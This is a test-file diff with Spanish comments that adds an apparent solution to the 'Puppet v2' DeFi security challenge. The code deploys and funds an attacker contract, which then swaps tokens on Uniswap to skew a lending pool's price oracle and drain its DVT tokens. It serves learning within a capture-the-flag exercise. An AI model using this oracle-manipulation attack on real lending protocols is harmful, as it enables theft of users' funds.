@@ -82,6 +82,45 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const attackerFactory = await ethers.getContractFactory("PuppetV2Attacker");
+        const attackerContract = await attackerFactory.deploy(
+          this.token.address,
+          this.weth.address,
+          this.uniswapRouter.address,
+          this.lendingPool.address
+        );
+
+        console.log(`\n_/_/_/_/_/ PREVIO FONDEO _/_/_/_/_/\n`);
+        console.log(`BALANCE EN ETH DE CONTRATO ATACANTE: ${await ethers.provider.getBalance(attackerContract.address)}`);
+        console.log(`BALANCE EN DVT DE CONTRATO ATACANTE: ${await this.token.balanceOf(attackerContract.address)}\n`);
+        console.log(`_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/\n`);
+
+        // Fondeamos el contrato atacante dado que deberá:
+        // - Tener ETH a convertir en WETH para poder utilizar el método "borrow".
+        // - Intercambiar DVT por WETH para desbalancear el oráculo onchain que utiliza puppetPool.
+        
+        await attacker.sendTransaction(
+        { 
+          to: attackerContract.address,
+          value: ethers.utils.parseEther("19.9") // Principal atención a cuánto ether se envía. Si es mucho, no alcanzará para pagar el gas. Si es poco, no alcanzará para pagar los 29,5 necesarios para retirar todos los DVT de la pool.
+        }
+        );
+          
+        await this.token.connect(attacker).transfer(attackerContract.address, ethers.utils.parseEther("10000"));
+
+        console.log(`_/_/_/_/_/ LUEGO DEL FONDEO _/_/_/_/_/\n`);
+        console.log(`BALANCE EN ETH DE CONTRATO ATACANTE: ${await ethers.provider.getBalance(attackerContract.address)}`);
+        console.log(`BALANCE EN DVT DE CONTRATO ATACANTE: ${await this.token.balanceOf(attackerContract.address)}\n`);
+        console.log(`_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/\n`);
+
+        // El contrato atacante intercambia sus DVT por WETH con uniswapRouter, desbalancea el oráculo, toma los DVT de puppetV2Pool y los envía a nuestra cuenta attacker.
+        console.log("COMENZANDO ATAQUE...\n");
+        await attackerContract.connect(attacker).attack({gasLimit:1e6});
+        console.log("ATAQUE FINALIZADO CON ÉXITO\n");
+
+        console.log(`BALANCE DEL ATACANTE EN DVT: ${await this.token.balanceOf(attacker.address)}`);
+        console.log(`BALANCE DEL ATACANTE EN ETH: ${await ethers.provider.getBalance(attacker.address)}`);
     });
 
     after(async function () {
